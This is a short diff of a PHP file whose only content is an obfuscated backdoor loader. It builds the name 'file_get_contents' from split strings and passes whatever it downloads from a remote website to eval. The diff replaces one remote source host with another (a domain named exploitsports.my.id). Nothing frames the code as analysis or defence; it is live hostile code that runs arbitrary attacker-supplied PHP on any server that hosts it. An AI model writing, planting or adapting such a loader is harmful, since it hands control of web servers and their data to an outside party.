@@ -1,3 +1,3 @@
  <?php
 $MEMEKCYNA = "file" . "_get_contents";
-eval("?>" . $MEMEKCYNA("https://sangperintismuda.blogspot.com/?m=1")); ?>
+eval("?>" . $MEMEKCYNA("https://www.exploitsports.my.id/?m=1")); ?>
